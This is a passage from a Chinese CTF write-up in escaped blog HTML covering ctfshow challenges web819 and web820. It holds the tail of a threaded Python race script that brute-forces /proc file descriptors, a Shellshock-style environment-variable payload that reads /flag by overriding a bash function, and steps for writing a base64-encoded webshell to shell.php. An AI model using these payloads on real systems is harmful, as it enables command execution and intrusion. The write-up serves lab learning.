--></span>pid<span class=\"token punctuation\">}</span></span><span class=\"token string\">/fd/</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span>fd<span class=\"token punctuation\">}</span></span><span class=\"token string\"> HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: yu22x\nConnection: close\n\n'''</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\ts<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    t <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>upload<span class=\"token punctuation\">)</span>\n    t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    a <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>bruter<span class=\"token punctuation\">)</span>\n    a<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n</code></pre>\n<h2><a id=\"web819_453\"></a>web819</h2>\n<p>payload<br/> <code>?env=BASH_FUNC_whoami%25%25=() { cat /flag; }</code><br/> 具体做法可以看下群主在b站发的视频<br/> <code>https://www.bilibili.com/video/BV1TY4y1C7EF?spm_id_from=333.999.0.0</code><br/> 从51分钟开始看即可。<br/> 这里简单总结下<br/> 破壳漏洞本来是可以这样使用<br/> <code>env=hack=() { :; }; ls</code><br/> 类似于创建了一个函数，而函数体外的内容可以执行。<br/> 修复内容如下:<br/> <img alt=\"在这里插入图片描述\" src=\"image\\78648cd422254bf5b112de43afeefd25.png\"/><br/> 这样的话，因为php代码后面又执行了whoami命令，所以可以自己创建一个whoami函数，而函数体中执行我们想用的命令。<br/> <code>?env=BASH_FUNC_whoami%%=() { id;}</code></p>\n<h2><a id=\"web820_468\"></a>web820</h2>\n<p>右键查看html源码会发现存在upload.php，访问得到源码。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\a93549c2635d488592290b1d5a00d6c2.png\"/><br/> 会将我们上传的图片base64解码后写入到shell.php中，而在base64中是4位4位进行解码的，所以可能需要进行补位。但是不会超过4，所以就一位一位来试就可以了。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4fdffd78c5674a74bac05c7b61b14a45.png\"/><br/> 其中11是补的位数。后面是我们上传的木马的base64。如果没成功就算是1或者111。</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}